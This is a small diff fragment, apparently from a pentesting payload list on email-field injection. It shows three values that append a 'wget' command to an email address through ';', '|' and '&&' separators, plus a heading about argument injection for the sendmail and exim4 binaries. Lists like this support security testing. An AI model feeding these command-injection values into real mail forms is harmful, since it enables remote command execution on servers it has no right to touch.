@@ -5,6 +5,7 @@ Linux/Unix"
 "ss@email.com;wget http://127.0.0.1/test"
 "ss@email.com|wget http://127.0.0.1/test"
 "ss@email.com&&wget http://127.0.0.1/test"
+...
 
 2. Argument Injections, for sendmail/exim4 binary:
 
